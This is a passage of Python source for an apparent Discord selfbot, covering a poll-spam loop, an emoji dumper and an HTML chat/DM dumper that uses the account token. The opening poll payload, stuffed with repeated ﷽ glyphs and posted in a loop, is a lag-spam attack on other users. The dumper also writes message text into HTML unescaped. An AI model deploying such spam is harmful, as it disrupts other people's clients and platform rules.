            "answers": [{"poll_media": {"text": "﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽"}}, {"poll_media": {"text": "﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽"}},{"poll_media": {"text": "﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽"}},{"poll_media": {"text": "﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽"}},{"poll_media": {"text": "﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽"}},{"poll_media": {"text": "﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽"}},{"poll_media": {"text": "﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽"}},{"poll_media": {"text": "﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽"}},{"poll_media": {"text": "﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽"}},{"poll_media": {"text": "﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽"}}]
        }
    }

    for i in range(times):
        if stopper == True:
            return
        (await arequesters.post(url=url, headers=headers, json_data=json_data))
        time.sleep(1.25)

@Repent.command(description=f"Creates a folder for dumped emojis from a specified server. \nUsage: {config_get('prefix')}emojidump [server id]", help="dumping")
async def emojidump(ctx, server_id: int=None):  
    try:
        server = Repent.get_guild(server_id)
        if not server:
            await ctx.send("Server not found.")
            return
        dump_dir = os.path.join(os.getcwd(), 'Data', 'Dumps', 'Dumped Emojis', filesafe(server.name))
        os.makedirs(dump_dir, exist_ok=True)
        async with aiohttp.ClientSession() as session:
            tasks = []
            for emoji in server.emojis:
                emoji_url = str(emoji.url)
                emoji_extension = 'gif' if emoji.animated else 'png'
                emoji_filename = os.path.join(dump_dir, f'{emoji.name}.{emoji_extension}')
                tasks.append(download_emoji(session, emoji_url, emoji_filename))
            await asyncio.gather(*tasks)
        header = "EmojiDump"
        body = f"Emojis from {server.name} downloaded!"
        cmdname = "Emoji Dump"
        await panelmaker(ctx, header, body, cmdname)
    except Exception as e:
        print(f"{Fore.LIGHTRED_EX}[ERROR]: {Fore.RESET}An error occurred during emoji dump: {e}")
        await ctx.send("An error occurred during emoji dump.", delete_after=int(config_get("delete_timer")))
        await send_webhook("Emoji Dump Error", f"An error occurred during emoji dump: {str(e)}. Please check the logs for more details.", config_get('error_webhook_url'))

async def download_emoji(session, emoji_url, emoji_filename):
    async with session.get(emoji_url) as response:
        if response.status == 200:
            async with aiofiles.open(emoji_filename, 'wb') as f:
                await f.write(await response.read())

@Repent.command(aliases=['dmdump'], description=f"Creates an HTML document of a dumped DM/channel. \nUsage: {config_get('prefix')}chatdump [channel id]", help="dumping")
async def chatdump(ctx, channel_id: int = None):
    dump_type = None
    target_name = None
    chans = (await arequesters.get('https://discord.com/api/v9/users/@me/channels', headers={"Authorization": config_get('token'), "X-Super-Properties": getxsuper()})).json()
    if channel_id is None:
        channel_id = ctx.channel.id
    channel = Repent.get_channel(int(channel_id))
    if not channel:
        for chan in chans:
            if str(chan['id']) == str(channel_id):
                channel = Repent.get_user(int(chan['recipients'][0]['id']))
                dump_type = "DM"
                target_name = chan['recipients'][0]['username']
                break
        if not channel:
            header = "Error"
            body = "Channel Not Found!"
            cmdname = "Chat Dump"
            await panelmaker(ctx, header, body, cmdname)
            return
    
    if isinstance(channel, discord.TextChannel):
        dump_type = "Server Channel"
        target_name = channel.name
    elif isinstance(channel, discord.GroupChannel):
        dump_type = "Group Chat"
        target_name = ', '.join([m.name for m in channel.recipients])
    elif isinstance(channel, discord.DMChannel):
        dump_type = "DM"
        target_name = channel.recipient.name 
    elif isinstance(channel, discord.Thread):
        dump_type = "Thread"
        target_name = channel.name 
    
    if target_name is not None:
        dump_dir = os.path.join(os.getcwd(), 'Data', 'Dumps', 'Dumped Chats')
        os.makedirs(dump_dir, exist_ok=True)        

        chat_style = """
        <style>
        .embed {
            padding: 10px;
            background-color: #2B2D31;
            border-radius: 8px;
            display: flex;
            border-left-width: 5px;
            max-width: 500px
        }

        .embed-image-container {
            display: inline-block;
            padding: 5px;
            background-color: #2B2D31;
            border-radius: 8px;
            max-width: 500px
        }

        .embed-content {
            flex: 1;
        }

        .embed-title a {
            text-decoration: none;
            color: inherit;
        }

        .embed-description {
            font-size: 0.9em;
            margin-bottom: 10px;
        }

        .embed-media {
            margin-top: 10px;
        }

        .image {
            max-width: 25%;
            height: auto;
        }

        .videoo {
            max-width: 25%;
            height: auto;
        }

        .embed-image {
            max-width: calc(100% - 10px);
            height: auto;
            border-radius: 8px;
        }

        .embed-video {
            max-width: calc(100% - 10px);
            height: auto;
        }

        body {
            background-color: #313338;
            color: #ffffff;
            font-family: Arial, sans-serif;
            margin: 0;
            padding: 10px;
        }

        .timestamp {
            color: #888888;
            font-size: 0.8em;
            margin-left: 5px;
            margin-right: 5px;
        }

        .chat-wrapper {
            position: relative;
            overflow-y: auto;
            padding: 10px;
        }

        .chat-container {
            display: flex;
            flex-direction: column; 
        }

        .message {
            display: flex;
            align-items: flex-start;
            padding-bottom: 10px;
        }

        .profile-image {
            width: 32px;
            height: 32px;
            border-radius: 50%;
            margin-right: 5px;
        }

        .message-content {
            display: flex;
            flex-direction: column;
            word-wrap: break-word; 
        }

        .message-header {
            display: flex;
            align-items: center;
            width: 100%;
        }

        .author {
            color: #7289da;
            font-weight: bold;
        }

        .audio {
            width: 100%;
        }
        </style>
        """
        messages = []
        async for message in channel.history(limit=None, oldest_first=True):
            messages.append(await process_message(message, ctx))   
        chat_filename = os.path.join(dump_dir, f'{filesafe(target_name)}_chat.html')
        async with aiofiles.open(chat_filename, 'w', encoding='utf-8') as f:
            await f.write("<html>")
            await f.write(chat_style)
            await f.write("<body>")
            await f.write('<div class="chat-wrapper">')
            await f.write('<div class="chat-container">')
            await f.write('\n'.join(messages))
            await f.write('</div>')
            await f.write('</div>')
            await f.write("</body></html>")
        
        header = "ChatDump"
        body = f"Chat from {dump_type} '{target_name}' downloaded!"
        cmdname = "Chat Dump"
        await panelmaker(ctx, header, body, cmdname)
    else:
        header = "Error"
        body = f"Could not get targets name."
        cmdname = "ERROR"
        await panelmaker(ctx, header, body, cmdname)

async def process_message(message, bot):
    author = message.author.name
    content = message.content.replace('\n', '<br>')
    profile_image_url = message.author.avatar
    embeds_html = ''
    link_regex = re.compile(r'https?://[^\s/]+(?:/[^\s]*)?')
    
    for match in link_regex.finditer(content):
        url = match.group()
        extension_match = re.search(r'\.(\w+)(?:\?|$)', url)
        extension = extension_match.group(1).lower() if extension_match else None
        if extension in ('png', 'jpg', 'jpeg', 'gif'):
            embeds_html += f'<img src="{url}" class="image"/><br>'
        elif extension in ('mp4', 'webm'):
            embeds_html += f'<video controls class="video"><source src="{url}" type="video/{extension}"></video><br>'
        else:
            if extension not in ('png', 'jpg', 'jpeg', 'gif', 'mp4', 'webm'):
                async with aiohttp.ClientSession() as session:
                    try:
                        async with session.get(url) as resp:
                            if resp.status == 200:
                                html_content = await resp.text()
                                soup = bs4(html_content, 'html.parser')
                                og_title = soup.find('meta', property='og:title')
                                og_description = soup.find('meta', property='og:description')
                                og_image = soup.find('meta', property='og:image')
                                theme_color = soup.find('meta', attrs={'name': 'theme-color'})
                                
                                title = og_title['content'] if og_title else (soup.find('title').text.strip() if soup.find('title') else url)
                                description = og_description['content'] if og_description else (soup.find('meta', attrs={'name': 'description'}).get('content') if soup.find('meta', attrs={'name': 'description'}) else (soup.find(re.compile(r'h[1-6]')).get_text() if soup.find(re.compile(r'h[1-6]')) else url))
                                image_url = og_image['content'] if og_image else ''
                                color = theme_color['content'] if theme_color else '#cccccc'
                                
                                if color.startswith("rgba"):
                                    rgba_values = [int(val) for val in color.strip("rgba()").split(",")[:3]]
                                    color = '#{:02x}{:02x}{:02x}'.format(*rgba_values)
                                
                                embeds_html += f'''
                                    <div class="embed" style="border-left: 5px solid {color};">
                                        <div class="embed-content">
                                            <div class="embed-title" style="padding: 3px;color: #00A8FC;"><a href="{url}" target="_blank"><b>{title}</b></a></div>
                                            <div class="embed-description" style="padding-left: 5px">{description}</div>
                                            <div class="embed-media">
                                                {f'<div class="embed-image-container"><img src="{image_url}" class="embed-image"/></div>' if image_url else ''}
                                            </div>
                                        </div>
                                    </div><br>
                                '''
                            else:
                                embeds_html += f'<a href="{url}" target="_blank">{url}</a><br>'
                    except aiohttp.ClientConnectorError:
                        embeds_html += f'<a href="{url}" target="_blank">{url}</a><br>'
                    except Exception as e:
                        embeds_html += f'<div>Error processing URL {url}: {str(e)}</div><br>'

    attachments_html = ''
    if message.attachments:
        for attachment in message.attachments:
            content_type = attachment.content_type.lower() if attachment.content_type else None
            if content_type:
                if 'image' in content_type:
                    attachments_html += f'<img src="{attachment.proxy_url}" class="image"/><br>'
                elif 'video' in content_type:
                    attachments_html += f'<video controls class="video"><source src="{attachment.proxy_url}" type="{content_type}"></video><br>'
                elif 'audio' in content_type:
                    attachments_html += f'<audio controls class="audio"><source src="{attachment.url}" type="{content_type}"></audio><br>'
                else:
                    attachments_html += f'<a href="{attachment.proxy_url}" download="{attachment.filename}">{attachment.filename}</a><br>'
    
    content_with_emojis = content
    for emoji_match in re.finditer(r'<a?:(\w+):(\d+)>|(:\w+:)', message.content):
        emoji_name = emoji_match.group(1)
        emoji_id = emoji_match.group(2)
        emoji_code = f"<:{emoji_name}:{emoji_id}>" if emoji_id else f"{emoji_match.group()}"
        has_text = any(c.isalpha() or c.isdigit() or c in string.punctuation for c in filter(lambda x: ord(x) < 128, message.content.replace(emoji_code, '')))
        emoji_size = '1em' if has_text else '3em'
        if emoji_id:
            emoji_url = f'https://cdn.discordapp.com/emojis/{emoji_id}'
            content_with_emojis = content_with_emojis.replace(emoji_match.group(), f'<img src="{emoji_url}.{"gif" if message.content.startswith("<a:") else "png"}" style="height: {emoji_size}; width: {emoji_size};"/>')
        elif emoji_name:
            emoji_obj = discord.utils.get(bot.emojis, name=emoji_name)
            if emoji_obj:
                emoji_url = emoji_obj.url
                content_with_emojis = content_with_emojis.replace(emoji_match.group(), f'<img src="{emoji_url}" style="height: {emoji_size}; width: {emoji_size};"/>')

    return f'''
        <div class="message">
            <img src="{profile_image_url}" class="profile-image"/>
            <div class="message-content">
                <div class="message-header">
                    <span class="author">{author}</span>
                    <span class="timestamp">{message.created_at.strftime('%Y-%m-%d %H:%M:%S')}</span>
                </div>
                <span>{content_with_emojis}</span>
                {embeds_html}
                {attachments_html}
            </div>
        </div>
    '''
